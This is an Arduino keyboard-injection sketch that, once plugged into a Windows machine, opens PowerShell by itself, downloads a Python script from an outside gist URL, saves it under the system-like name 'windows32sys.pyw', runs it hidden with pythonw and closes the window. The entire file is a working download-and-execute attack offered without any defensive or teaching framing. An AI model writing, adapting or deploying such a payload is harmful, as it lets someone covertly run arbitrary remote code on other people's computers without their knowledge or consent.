#include <Keyboard.h>

void typeAndEnter(const char* text, int waitAfter = 500) {
  Keyboard.print(text);
  delay(waitAfter);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(waitAfter);
}

void setup() {
  Keyboard.begin();

  delay(2000); 

 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print("powershell");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(2000); 

  
  Keyboard.print("Invoke-WebRequest -Uri \"https://gist.githubusercontent.com/Sirage7474/c9bbfa94da967d73fd59b9eec48d9975/raw/6d9c92d4e852e382c28d4a641f539bebd0065359/windows32sys.py\" ");
  Keyboard.print("| Select-Object -ExpandProperty Content ");
  Keyboard.print("| Out-File -Encoding utf8 -Append windows32sys.pyw");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(5000); 

  
  typeAndEnter("pythonw windows32sys.pyw", 1000);

  delay(3000);

  typeAndEnter("exit", 500);

  Keyboard.end();
}

void loop() {

}
